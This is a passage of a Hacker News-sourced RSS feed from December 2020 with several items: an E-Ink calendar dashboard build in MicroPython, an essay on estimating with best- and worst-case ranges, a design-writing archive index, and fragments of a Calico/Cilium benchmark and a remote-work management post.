<p>To avoid the error <code>etcdserver: Request entity too large</code> multiple NetworkPolicy manifests (for Cilium and
Calico) are created with each containing a maximum of 50000 CIDR entries. When the number of rules increases,
more manifests are created and sent to the Kubernetes API server.</p>
</li>
<li>
<p>One possible source of error in testing is if the Kubernetes API server and etcd themselves become a
bottleneck for requests, especially when a lot of resources are created in a short span of time. since both
Calico and Cilium use them extensively. Therefore, Controller nodes were chosen such that they can …</p></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kinvolk.io/blog/2020/12/egress-filtering-benchmark-part-2-calico-and-cilium/">https://kinvolk.io/blog/2020/12/egress-filtering-benchmark-part-2-calico-and-cilium/</a></em></p>]]>
            </description>
            <link>https://kinvolk.io/blog/2020/12/egress-filtering-benchmark-part-2-calico-and-cilium/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560912</guid>
            <pubDate>Mon, 28 Dec 2020 17:12:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Media.ccc.de – RC3: Remote Chaos Experience]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560900">thread link</a>) | @pelasaco
<br/>
December 28, 2020 | https://media.ccc.de/b/conferences/rc3 | <a href="https://web.archive.org/web/*/https://media.ccc.de/b/conferences/rc3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://media.ccc.de/b/conferences/rc3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560900</guid>
            <pubDate>Mon, 28 Dec 2020 17:11:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Building an E-Ink Calendar and a UI Toolkit along the way]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25560570">thread link</a>) | @rahulrav
<br/>
December 28, 2020 | https://rahulrav.com/blog/e_ink_dashboard.html | <a href="https://web.archive.org/web/*/https://rahulrav.com/blog/e_ink_dashboard.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <main>
            <div>
              <div>
                <p>December 27 2020, Monday</p>
<h3 id="building-an-e-ink-calendar-and-a-ui-toolkit-along-the-way">Building an E-Ink Calendar, and a UI Toolkit along the way</h3>
<p>Having worked from home for the better part of the year, I recently started to work on a new project. Building a E-Ink based dashboard which would keep track of my meetings among other things. Given the always-on nature of the E-Ink display, this would help me better manage by schedule during a typical work-day especially given I tend to miss Google Calendar notifications <em>a lot</em>. </p>
<p>This is what the end result looks like:</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_end_result.jpg" alt="Top View" title="E-Ink Dashboard" width="640px">
</p>
<p>The app here is showing the next 5 Calendar events for <strong>a demo Google account</strong>.<br>
Looks nice and simple, does it not ?</p>
<h4 id="the-hardware">The Hardware</h4>
<p>I took an off-the-shelf approach for the hardware. I purchased an <a href="https://inkplate.io/">InkPlate 6</a> which was originally crowd-funded on <a href="https://www.crowdsupply.com/e-radionica/inkplate-6">CrowdSupply</a>.</p>
<p>The E-Ink display is from a recycled Kindle e-reader, which means its a pretty great display. It has 2 modes including a 2-bit per pixel gray-scale mode and monochrome. It supports partial updates in monochrome mode. The display is connected to a <code>ESP 32</code>, with built-in WiFi. All we need to do is to hookup the display to a PC via a USB cable and power it on. The display also comes with a nice 3D printed enclosure. </p>
<h4 id="the-software">The Software</h4>
<p>The InkPlate 6 supports MicroPython, and recently the libraries powering the display were <a href="https://github.com/e-radionicacom/Inkplate-6-micropython">opensourced</a>. This gave me a decent foundation to build on top-of.</p>
<h5 id="oauth2-support">OAuth2 support</h5>
<p>The first step to showing events from Google Calendar is to be able to complete an <code>OAuth2</code> flow. I decided to use the <a href="https://developers.google.com/identity/protocols/oauth2/limited-input-device">device flow</a> given the limited input capabilities of the ESP 32. </p>
<p>MicroPython does not have any libraries that work with <code>OAuth2</code>, so I decided to write one. Here is the <a href="https://github.com/micropython/micropython-lib/pull/407">PR</a> that I eventually made to the <a href="https://github.com/micropython/micropython-lib">micropython-lib</a> GitHub repo which adds support for this specification. This ended up being pretty straightforward, given my familiarity with OAuth2 (having authored <a href="https://github.com/openid/AppAuth-JS">this</a> library before).</p>
<h5 id="building-a-limited-ui-toolkit">Building a limited UI-Toolkit</h5>
<p>The <code>InkPlate</code> has a decent <a href="https://github.com/e-radionicacom/Inkplate-6-micropython/blob/master/gfx.py">Graphics</a> API, but rather than having to hard-code coordinates to render UI i decided to take minor detour and build a mini UI Toolkit from first principles based on the graphics primitives that were supported. I took a lot of inspiration from the <em>existing</em> Android UI View system and build a small subset of those APIs.</p>
<h6 id="measuring-text">Measuring text</h6>
<p>The first step was to be able to measure the text to be able to compute how much space <code>text</code> with a given <code>text size</code> would occupy on the screen. The <code>InkPlate</code> uses bitmap fonts, so i ended up using a look-up-table for widths and heights for individual letters for a given size. It's an approximation, but it worked well enough for me to proceed to the next step.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_1.jpg" alt="Top View" title="Step 1: Measuring text" width="640px">
</p>
<h6 id="columns-alignment-and-padding">Columns, Alignment and Padding</h6>
<p>Now that I had text measurements I could start drawing some text in <code>Columns</code> and <code>Rows</code> (these are the containers supported by the  custom layout system). I managed to also implement <code>padding</code> and text <code>alignments</code>. Not perfect, but still pretty good progress. </p>
<p>The image below consists of a single <code>Column</code> with a nested <code>Row</code> and a bunch of <code>Text</code> nodes in various alignments and sizes. The <code>10px</code> box on top is a component called <code>Spacer</code> which just occupies empty space on the screen.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_2.jpg" alt="Top View" title="Step 2: Columns, Padding &amp; Alignments" width="640px">
</p>
<h6 id="columnar-layouts-and-alignments">Columnar Layouts and alignments</h6>
<p>Now that I had some basic building blocks, I decided to go further and implement more complex layouts. I implemented support for <code>aligning</code> containers and fixed a lot of bugs when nesting containers. You can also see <code>text alignments</code> within individual <code>Column</code> containers working.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_3.jpg" alt="Top View" title="Step 3: Columnar Layouts &amp; Nested Containers" width="640px">
</p>
<h6 id="supporting-images">Supporting Images</h6>
<p>I finally added support for <code>Image</code> nodes to layouts. This is also when I started to add some much needed UI polish. </p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_4.jpg" alt="Top View" title="Step 4: Supporting Images &amp; Initial UI" width="640px">
</p>
<h6 id="miscellaneous-features">Miscellaneous Features</h6>
<p>I also worked on other additional features along the way, including:</p>
<ul>
<li>Support &amp; configuration for time zones. The MicroPython runtime on the ESP 32 does <em>not</em> ship with a Time Zone database and the real time clocks only support UTC seconds after epoch. </li>
<li>Support for token caching &amp; persistence. This was a big feature because this would mean that I could serialize the <code>auth state</code> on the device. This meant that I did not have to do the full <code>OAuth2</code> dance every single time I started the app.</li>
<li>A small <code>DateTime</code> library capable of formatting dates in a couple of different formats. </li>
<li>Support for <code>Deep Sleep</code>. This would allow the device to conserve power by not having to do anything. The device would only wake up once every <code>N</code> minutes to refresh the events in the <code>Calendar</code>. </li>
</ul>
<h4 id="summary">Summary</h4>
<p>This project was a <strong>lot of fun</strong>. I learnt a lot, especially given that I did not intend to build a UI Toolkit when I started working on the project). The toolkit i built is janky, but it is an accomplishment, considering I have never built one before. </p>
<p>MicroPython was incredible to prototype with (despite lacking a graphical debugger). I would highly recommending picking up a board that supports MicroPython for your next hardware project. The MicroPython community (libraries + forums) is also pretty active and helpful</p>
<h4 id="epilogue">Epilogue</h4>
<p>All the source code that I wrote for the project is on <a href="https://github.com/tikurahul/Inkplate-6-micropython">GitHub</a>. The entry point is a file called <a href="https://github.com/tikurahul/Inkplate-6-micropython/blob/master/app.py"> <code>app.py</code></a>. Bear in mind, that all of this code was written in ~ a week long period. I also plan on making some more minor improvements to the UI. </p>
              </div>
            </div>
            
          </main>
          
          
          
        </div></div>]]>
            </description>
            <link>https://rahulrav.com/blog/e_ink_dashboard.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560570</guid>
            <pubDate>Mon, 28 Dec 2020 16:38:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Accurate Estimations]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25560386">thread link</a>) | @1penny42cents
<br/>
December 28, 2020 | https://camhashemi.com/2020/12/28/accurate-estimations/ | <a href="https://web.archive.org/web/*/https://camhashemi.com/2020/12/28/accurate-estimations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-269">
			<!-- .entry-header -->
		<div>
		
<p>We’re constantly asked to give estimates:</p>



<p><em>How long will it take?<br>How much will it cost?</em><br><em>What time should we leave?</em><br><em>How much do you want?</em></p>



<p>Estimations are information about the unknown. We constantly use this information to make decisions: allocating resources, changing strategies, and choosing partners. But despite all this practice, we’re horrible at accurate estimations.</p>



<h2>Why Estimations are Hard</h2>



<p>Estimations are hard for both technical and social reasons.</p>



<p>We don’t know what we don’t know. Naive estimators fail to account for surprises. They estimate based on known factors and best-case scenarios. These estimates may be <em>perfectly accurate</em> beforehand, but they’re instantly broken by the first surprise.</p>



<p>Experienced estimators account for this problem by ‘adding some buffer’. But even then, how much should they add? Even knowing that surprises <em>can</em> happen, it’s impossible to <em>how many</em> will happen or <em>the impact</em> of those surprises. Choosing the right amount of buffer is a lot like making the right estimation in the first place. We still don’t know what we don’t know. And adding too much buffer can be as expensive as failing to account for surprise at all.</p>



<p>In addition to this technical problem, there’s a strong social problem. Let’s imagine two common scenarios.</p>



<p>In the first scenario, you just gave  giving an estimate to your team. You perfectly estimate that a project will take three weeks; but your manager gives you a puzzled look. Your teammate snickers, claiming they could do it in a week, tops. The feeling is that you must be either lazy or incompetent to give such a padded estimation. You newly shortened estimate is wrong, so you go on to extend the project’s deadline twice in three weeks. Rather than holding you accountable to that one-week estimate, your manager commends you for being able to handle the unforeseen surprises on such a complicated project.</p>



<p>In the other scenario, you’re giving an estimate to a potential client. You perfectly estimate that a project will take three weeks; but your competitor only estimates it’ll take a week. The client signs with your competitor. Since their estimate was wrong, your competitor goes on to extend the deadline twice in three weeks. Even though your estimate was accurate, your client’s estimate got them paid.</p>



<p>I’ve been in countless scenarios like this. Sometimes people outright pressure us into shortening our estimations, and sometimes the voice in our heads push us to. Either way, giving accurate estimates is both technically hard and socially challenging [1].</p>



<h2>Two Types of Estimators</h2>



<p>In response to this hard problem, we become systematic underestimators or systematic overestimators.</p>



<p>Underestimators fail to give enough buffer. This strategy has two key benefits. First, it signals (unrealistically) high performance. Like our virtue-signalling teammate, we can underestimate ahead of time, then point at concrete surprises for our eventual underperformance. And like our overpromising competitor, we can underestimate during a bid and do whatever we want after the contract is signed. Second, tight estimates demand efficiency. Underestimators set deadlines that they and their teams must work hard to meet. Underestimation works well when the costs of going over-budget are small. But when those costs are large, underestimations lead to disasters. On the whole, underestimators systematically run the risk of being burnt out, past-deadline, and over-budget.</p>



<p>Overestimators are instead biased towards large buffers. Extreme overestimators might send you articles titled “Estimations are a Scam”, or claim that estimations are simply tools for worker exploitation. Overestimation works when the costs of buffer are low and the costs of going over budget are high. But overestimators are constantly taxed by Parkinson’s Law. Parkinson’s Law is the pattern where projects fill the time and resources they’re allocated, instead of the time and resources they need [2]. Rather than pushing towards peak performance, overestimators systematically move at a bored, leisurely pace. Overestimators are also demotivating. Rather than inspiring the team to reach competitive goals, they disparage those who do. So while underestimators run the risk of their teams burning out, overestimators run the risk of their teams shutting down.</p>



<p>To simplify the hard problem of estimations, we slowly become under- or over-estimators. We reap the systematic rewards and accept the systematic costs. These chosen strategies may work in many contexts. But for any simple strategy, there are worst-case scenarios where those systematic risks blow up. Underestimators blow up when the costs of going over budget skyrocket. Overestimators blow up when the costs of adding extra buffer skyrocket.</p>



<p>This line between underestimators and overestimators forms a classic “spectrum problem”. A spectrum problem occurs when we oversimplify the solution to a given tradeoff. In this case, we’re splitting the spectrum of estimation strategies in half. Underestimators fall on one side of the line, and overestimators fall on the other. With many spectrum problems, the better solution is to cut the spectrum into three pieces, choosing the middle strategy between extremes. In doing so, we acknowledge the costs and rewards of both sides, maximizing the upsides and minimizing the downsides systematically.</p>



<h2>Playing Single-Pointed Darts</h2>



<p>Imagine a game of darts with very simple rules. I throw my dart first, and you only score by hitting that same exact dart-sized point. This game is very simple, but so difficult that nobody would play it. To make darts playable, we specify scoring <em>ranges</em>. These same ranges are missing from our everyday estimations.</p>



<p>The most common estimate sounds something like: “I’ll have it ready by 5pm.” But this is just like playing single-point darts! Imagine that this estimate is perfectly precise: the project can’t be ready one second before or one second after 5pm. While impressive, there’s zero room for error. If we end up sick, or if the project ends up more complex than expected, our estimate becomes instantly wrong.</p>



<p>To account for surprises, we can add buffer. But adding buffer only shifts the dart board over a few inches. “I’ll have it ready by 5pm <em>tomorrow</em>” faces all the same problems as the first estimation. Two days of surprises still makes me wrong. We’re still playing single-pointed darts.</p>



<p>It’s a losing game. And yet we see it played again and again, day after day, project after project.</p>



<h2>Playing Darts with Ranges</h2>



<p>To enjoy this game of darts, we need to change the rules. Rather than giving a single-pointed estimate, we give two points: one for the best case, and one for the worst case. These two points create a range of targets to hit, just like the game of darts we know and love.</p>



<p>To demonstrate, I can give an example from my personal life. My girlfriend is very punctual, and I’m not. She’s a classic overestimator, giving as much buffer as we can afford. And I’m a classic underestimator, giving the most optimistic estimates. So whenever we have somewhere to be, and she asks me “what time should we be ready?”… it’s a classic estimation problem!</p>



<p>My preference would be to underestimate, and tell her the last minute we can leave without being late. Her preference would be for me to overestimate, telling her the soonest we can leave without being “too early”. But no matter what I say, we face all of the same problems stated above.</p>



<p>Recently, I’ve started giving her two answers. The first answer is “the green time”. <strong>The green time tells us when we should leave so that we’re pleasantly early</strong>. The second answer is “the red time”. <strong>The red time is the last minute we can leave, without definitely being late</strong>. If we can be ready by the green time without stress or shortcuts, that’s perfect. Once we pass the green time, we go into the “yellow zone.” <strong>The yellow zone is the buffer between early and late</strong>. There’s no need to take shortcuts or change plans yet, but we’re getting close. Once we approach the red line, we start discussing the need to take shortcuts, or to start telling others that we may be a little late.</p>



<p>Having a green time, a yellow zone, and a red time transforms our game of single-pointed darts into a proper dartboard, with zones of success. The green time makes my girlfriend happy: she can be ready early without worry. The red time makes me happy: I can fill my buffer time up with other activities. And the yellow zone is a signal for both of us to get focused or to start taking shortcuts [3].</p>



<p>Aside from the technical benefits, I can <em>feel</em> the difference in enjoyment between playing single-pointed darts vs playing scoring-ranged darts. Having a range makes inherent uncertainty explicit to the group. Adding buffer doesn’t just shift the dartboard a few inches, it expands our range of accuracy. Larger buffers signal more uncertainty and require less precision, while smaller buffers signal more confidence and require more precision. The expression of certainty and confidence isn’t possible to communicate with a single-pointed estimate.</p>



<p>By estimating with two numbers instead of one, a richness of information and strategies are made available.</p>



<h2>Simple Changes</h2>



<p>Using two numbers instead of one, these so-called “confidence intervals” aren’t complicated. Then why are they so absent from everyday life?</p>



<p>Although nothing prevented us from discovering them earlier, the first mention of confidence intervals in scientific literature wasn’t until 1937. And it wasn’t until the 1980s that they were required in scientific journals. So if it took forty years for the most knowledgeable people to apply a simple solution towards the most urgent problems, it’s not surprising that it’s taken the rest of us at least as long. That said, the goal of this essay is to speed up that process.</p>



<p>We can move towards accurate estimations by practicing two …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://camhashemi.com/2020/12/28/accurate-estimations/">https://camhashemi.com/2020/12/28/accurate-estimations/</a></em></p>]]>
            </description>
            <link>https://camhashemi.com/2020/12/28/accurate-estimations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560386</guid>
            <pubDate>Mon, 28 Dec 2020 16:19:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reading Design: online archive of critical writing about design]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560311">thread link</a>) | @headalgorithm
<br/>
December 28, 2020 | https://www.readingdesign.org/index-1 | <a href="https://web.archive.org/web/*/https://www.readingdesign.org/index-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="pageWrapper">
        <section id="page">
          <div id="mainContent" role="main" data-content-field="main-content">
            
            
              
            
            
            
            
            

            <div data-type="page" data-updated-on="1598018231553" id="page-5478696de4b0306d2b1934c8"><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1417567828653_72178"><p>Reading Design&nbsp;is an online archive of critical writing about design. The idea is to embrace the whole of design, from architecture and urbanism to product, fashion, graphics and beyond. The texts featured here date from the nineteenth century right up to the present moment but each one contains something which remains relevant, surprising or interesting to us today.</p></div></div></div><div><div><div data-block-type="2" id="block-7fb70912265f44ec4a47"><div><p><a href="https://www.readingdesign.org/nakatomi-space">Back doors</a><br><a href="https://www.readingdesign.org/futurist-manifesto-mens-clothing">Balla, Giacomo</a><br><a href="https://www.readingdesign.org/autostrade">Barr, Sue</a><br><a href="https://www.readingdesign.org/tag-baudrillard-jean">Baudrillard, Jean</a><br><a href="https://www.readingdesign.org/the-new-typography">Bauhaus</a><br><a href="https://www.readingdesign.org/metal-work">Benson, W. A. S.</a><br><a href="https://www.readingdesign.org/politics-of-materials">Bingham-Hall, John</a><br><a href="https://www.readingdesign.org/design-and-democracy">Bonsiepe, Gui</a><br><a href="https://www.readingdesign.org/tag-book-covers">Book covers</a><br><a href="https://www.readingdesign.org/ideal-book">Book design</a><br><a href="https://www.readingdesign.org/tag-books">Books</a><br><a href="https://www.readingdesign.org/to-newton">Boullée, Étienne-Louis</a><br><a href="https://www.readingdesign.org/all-watched-over-by-machines">Brautigan, Richard</a><br><a href="https://www.readingdesign.org/tag-bridle-james">Bridle, James</a><br><a href="https://www.readingdesign.org/adf-manifesto">Brody, Neville</a><br><a href="https://www.readingdesign.org/form-of-housing">Brown, Neave</a><br><a href="https://www.readingdesign.org/the-limits-of-memory">Brutalism</a></p></div></div></div><div><div data-block-type="2" id="block-edd2eaf0d60a2bc456d1"><div><p><a href="https://www.readingdesign.org/cafes">Cafés</a><br><a href="https://www.readingdesign.org/first-table">Campagna, Federico</a><br><a href="https://www.readingdesign.org/sculptures-new-spaces">Caro, Anthony</a><br><a href="https://www.readingdesign.org/the-designers-dilemma">Casey, Valerie</a><br><a href="https://www.readingdesign.org/fame-and-flw">Celebrity</a><br><a href="https://www.readingdesign.org/manifestos-hussein-chalayan">Chalayan, Hussein</a><br><a href="https://www.readingdesign.org/formulary">Chtcheglov, Ivan</a><br><a href="https://www.readingdesign.org/tag-cities">Cities</a><br><a href="https://www.readingdesign.org/how-not-to-be-a-starchitect">Clarke, Katherine</a><br><a href="https://www.readingdesign.org/1867-convention">Cole, Henry</a><br><a href="https://www.readingdesign.org/the-meaning-of-craft">Collingwood, R.G.</a><br><a href="https://www.readingdesign.org/the-work-ahead-of-us">Constructivism</a><br><a href="https://www.readingdesign.org/tag-coomaraswamy">Coomaraswamy, Ananda</a><br><a href="https://www.readingdesign.org/tag-craft">Craft</a><br><a href="https://www.readingdesign.org/vernacular-furniture">Creasy, Max</a><br><a href="https://www.readingdesign.org/critical-design-faq">Critical design</a><br><a href="https://www.readingdesign.org/feminist-architecture-a-z">Critical spatial practice</a><br><a href="https://www.readingdesign.org/there-is-no-criticism">Criticism</a><br><a href="https://www.readingdesign.org/dishonourable-success">Crowdfunding</a><br><a href="https://www.readingdesign.org/returning-duchamps-urinal">Cruz, Teddy</a><br><a href="https://www.readingdesign.org/high-vis-vest">Culture</a><br><a href="https://www.readingdesign.org/look-at-me">Cummings, Neil</a><br><a href="https://www.readingdesign.org/public-space">Cuyvers, Wim</a><br><a href="https://www.readingdesign.org/cafes">Czech, Hermann</a></p></div></div></div></div><div><div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1417197716657_140302"><div><p><a href="https://www.readingdesign.org/mantownhuman">Farlie, Alan</a><br><a href="https://www.readingdesign.org/freespace-manifesto">Farrell, Yvonne</a><br><a href="https://www.readingdesign.org/tag-fashion">Fashion</a><br><a href="https://www.readingdesign.org/village-design">Fathy, Hassan</a><br><a href="https://www.readingdesign.org/tag-feminism">Feminism</a><br><a href="https://www.readingdesign.org/tag-film">Film</a><br><a href="https://www.readingdesign.org/bradbury-building">Film Noir</a><br><a href="https://www.readingdesign.org/how-not-to-be-a-starchitect">Fior, Liza</a><br><a href="https://www.readingdesign.org/how-to-work-better">Fischli and Weiss</a><br><a href="https://www.readingdesign.org/forensis-counterforensics">Forensic Architecture</a><br><a href="https://www.readingdesign.org/tag-foster-norman">Foster, Norman</a><br><a href="https://www.readingdesign.org/of-other-spaces">Foucault, Michel</a><br><a href="https://www.readingdesign.org/antiracist-manifesto">Frankowski, Nathalie</a><br><a href="https://www.readingdesign.org/twelve-cautionary-tales">Frassinelli, Gian Piero</a><br><a href="https://www.readingdesign.org/on-interpretation">Friedman, Yona</a><br><a href="https://www.readingdesign.org/functionalism">Functionalism</a><br><a href="https://www.readingdesign.org/post-modernism">Furman, Adam</a><br><a href="https://www.readingdesign.org/tag-furniture">Furniture</a><br><a href="https://www.readingdesign.org/the-philosophy-of-furniture">Furniture design</a><br><a href="https://www.readingdesign.org/futurism">Futurism</a></p></div></div></div><div><div data-block-type="2" id="block-yui_3_17_2_1_1417198189195_23371"><div><p><a href="https://www.readingdesign.org/letter-to-soane">Gandy, Joseph</a><br><a href="https://www.readingdesign.org/antiracist-manifesto">Garcia, Cruz</a><br><a href="https://www.readingdesign.org/first-things-first">Garland, Ken</a><br><a href="https://www.readingdesign.org/time-and-place">Gill, Eric</a><br><a href="https://www.readingdesign.org/ten-things">Glaser, Milton</a><br><a href="https://www.readingdesign.org/foucaults-boomerang">Graham, Stephen</a><br><a href="https://www.readingdesign.org/understanding-repair">Grange, Kenneth</a><br><a href="https://www.readingdesign.org/tag-graphic-design">Graphic design</a><br><a href="https://www.readingdesign.org/smart-city">Greenfield, Adam</a><br><a href="https://www.readingdesign.org/programme-for-city-reconstruction">Gropius, Walter</a><br><a href="https://www.readingdesign.org/obligation-to-self-design">Groys, Boris</a></p></div></div></div></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1417567997806_118914"><div><p><a href="https://www.readingdesign.org/manifestos-john-maeda">Maeda, John</a><br><a href="https://www.readingdesign.org/nakatomi-space">Manaugh, Geoff</a><br><a href="https://www.readingdesign.org/tag-manifestos">Manifestos</a><br><a href="https://www.readingdesign.org/metal-work">Manufacturing</a><br><a href="https://www.readingdesign.org/music-and-architecture">Marcus, Laura</a><br><a href="https://www.readingdesign.org/margolies-roadside-america">Margolies, John</a><br><a href="https://www.readingdesign.org/barcelona-manifesto">Mari, Enzo</a><br><a href="https://www.readingdesign.org/rightness">Marriott, Michael</a><br><a href="https://www.readingdesign.org/fame-and-flw">Martin, Howard</a><br><a href="https://www.readingdesign.org/sodrakull-frosakull">Mathsson, Bruno</a><br><a href="https://www.readingdesign.org/temporary-fix">Mattern, Andy</a><br><a href="https://www.readingdesign.org/fairytales-and-fashion-criticism">Matthews, Rachel</a><br><a href="https://www.readingdesign.org/manifestos-mau">Mau, Bruce</a><br><a href="https://www.readingdesign.org/maxwell-peter">Maxwell, Peter</a><br><a href="https://www.readingdesign.org/hannover-principles">McDonough, William</a><br><a href="https://www.readingdesign.org/radical-urbanism">McGuirk, Justin</a><br><a href="https://www.readingdesign.org/freespace-manifesto">McNamara, Shelley</a><br><a href="https://www.readingdesign.org/first-table">Meaning</a><br><a href="https://www.readingdesign.org/exercise-in-modernity">Mendes da Rocha, Paulo</a><br><a href="https://www.readingdesign.org/apousiokoumpounophobia">Mentzel, Dora</a><br><a href="https://www.readingdesign.org/tag-gustav-metzger">Metzger, Gustav</a><br><a href="https://www.readingdesign.org/nightmare-of-participation">Miessen, Markus</a><br><a href="https://www.readingdesign.org/amusement-parks">Milstein, Jeffrey</a><br><a href="https://www.readingdesign.org/modernism">Modernism</a><br><a href="https://www.readingdesign.org/tag-moholynagylaszlo">Moholy-Nagy, László</a><br><a href="https://www.readingdesign.org/super-normal">Morrison, Jasper</a><br><a href="https://www.readingdesign.org/tag-morris-william">Morris, William</a><br><a href="https://www.readingdesign.org/how-not-to-be-a-starchitect">Muf</a><br><a href="https://www.readingdesign.org/museums">Museums</a><br><a href="https://www.readingdesign.org/music-and-architecture">Music</a></p></div></div></div></div></div></div><div><div><div><div><div data-block-type="2" id="block-37338354c815c031bdaa"><div><p><a href="https://www.readingdesign.org/knolling">Sachs, Tom</a><br><a href="https://www.readingdesign.org/manifestos-stefan-sagmeister">Sagmeister, Stefan</a><br><a href="https://www.readingdesign.org/manifesto-futurist">Sant'Elia, Antonio</a><br><a href="https://www.readingdesign.org/manifestos-peter-saville">Saville, Peter</a><br><a href="https://www.readingdesign.org/glass-architecture">Scheerbart, Paul</a><br><a href="https://www.readingdesign.org/stop">Schumacher, Patrik</a><br><a href="https://www.readingdesign.org/on-interior-design">Scott, Fred</a><br><a href="https://www.readingdesign.org/seaside-shelters">Scott, Will</a><br><a href="https://www.readingdesign.org/tag-scott-brown-denise">Scott Brown, Denise</a><br><a href="https://www.readingdesign.org/sculptures-new-spaces">Sculpture</a><br><a href="https://www.readingdesign.org/design">Sedding, John Dando</a><br><a href="https://www.readingdesign.org/the-pnyx-and-the-agora">Sennett, Richard</a><br><a href="https://www.readingdesign.org/nakatomi-space">Services</a><br><a href="https://www.readingdesign.org/mantownhuman">Sharro, Karl</a><br><a href="https://www.readingdesign.org/on-edge">Shonfield, Katherine</a><br><a href="https://www.readingdesign.org/philosophy-of-site">SITE</a><br><a href="https://www.readingdesign.org/tag-situationists">Situationists</a><br><a href="https://www.readingdesign.org/living-in-a-house">Siza, Álvaro</a><br><a href="https://www.readingdesign.org/team-10-primer">Smithson, Alison and Peter</a><br><a href="https://www.readingdesign.org/letter-to-soane">Soane, Sir John</a><br><a href="https://www.readingdesign.org/team-10-primer">Society</a><br><a href="https://www.readingdesign.org/conspicuous-consumption">Sociology</a><br><a href="https://www.readingdesign.org/sorkin-michael-tag">Sorkin, Michael</a><br><a href="https://www.readingdesign.org/sota">Sota Ríus, José de la</a><br><a href="https://www.readingdesign.org/mart">Stam, Mart</a><br><a href="https://www.readingdesign.org/how-to-kill-people">Steyerl, Hito</a><br><a href="https://www.readingdesign.org/why-capitalist-cities-plan">Stein, Sam</a><br><a href="https://www.readingdesign.org/tag-sullivan-louis">Sullivan, Louis</a><br><a href="https://www.readingdesign.org/twelve-cautionary-tales">Superstudio</a><br><a href="https://www.readingdesign.org/tag-sustainable-design">Sustainable Design</a></p></div></div></div></div><div><div><div data-block-type="2" id="block-yui_3_17_2_2_1417899325622_57321"><div><p><a href="https://www.readingdesign.org/programme-for-city-reconstruction">Wagner, Martin</a><br><a href="https://www.readingdesign.org/how-to-kill-people">War</a><br><a href="https://www.readingdesign.org/forensis-counterforensics">Weizman, Eyal</a><br><a href="https://www.readingdesign.org/urban-detective">Wentworth, Richard</a><br><a href="https://www.readingdesign.org/decoration-as-art">Wheeler, Candace</a><br><a href="https://www.readingdesign.org/tag-wilde-oscar">Wilde, Oscar</a><br><a href="https://www.readingdesign.org/tag-wiles-will">Wiles, Will</a><br><a href="https://www.readingdesign.org/mantownhuman">Williams, Austin</a><br><a href="https://www.readingdesign.org/mantownhuman">Williams, Richard J</a><br><a href="https://www.readingdesign.org/philosophy-of-site">Wines, James</a><br><a href="https://www.readingdesign.org/informal-arrangements">Wolf, Michael</a><br><a href="https://www.readingdesign.org/woods-lebbeus">Woods, Lebbeus</a><br><a href="https://www.readingdesign.org/a-room-of-ones-own">Woolf, Virginia</a><br><a href="https://www.readingdesign.org/ten-things">Work</a><br><a href="https://www.readingdesign.org/tract-i">Wren, Sir Christopher</a><br><a href="https://www.readingdesign.org/fame-and-flw">Wright, Frank Lloyd</a></p></div></div></div></div></div></div></div>

            
            
            
            
            
            
          </div>
        </section>
      </div></div>]]>
            </description>
            <link>https://www.readingdesign.org/index-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560311</guid>
            <pubDate>Mon, 28 Dec 2020 16:10:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My favorite startup management hack of 2020]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560287">thread link</a>) | @jasonkolb
<br/>
December 28, 2020 | https://jasonkolb.com/my-favorite-management-hack-of-2020/ | <a href="https://web.archive.org/web/*/https://jasonkolb.com/my-favorite-management-hack-of-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="1a84d1d0" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p>2020 was a rough year for everyone, even for those of us blessed to be able to work from home. Psychologically and emotionally, it’s easy to feel disconnected and lonely when you don’t see people outside your household for weeks and months on end. And this presents some unique challenges for maintaining culture and productivity, and keeping morale up in general.</p><p><strong>The Challenge</strong></p><p>When the pandemic hit in March and everyone in the world started working remotely, we were worried about how to keep people connected and plugged in. We had to adapt quickly to keep communication flowing and make sure that everyone felt connected and a part of the community that we somewhat lost when everyone stopped going into the office.</p><p>We developed a solution that has worked really well for us, and I’d like to share it. I hope you find it useful, but I’d love to hear if you’ve found other things that work as well.</p><p><strong>The Solution: Monday Morning</strong></p><p>Immediately after switching to full remote work, we switched up the cadence of company meetings. We went from an all hands once a month to two in the same week.</p><p>Every Monday morning at 9:30 we get everyone together (via Zoom) to kick off the week with a company-wide coffee hour.</p><figure><img width="1024" height="577" src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png" alt="" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png 1024w, 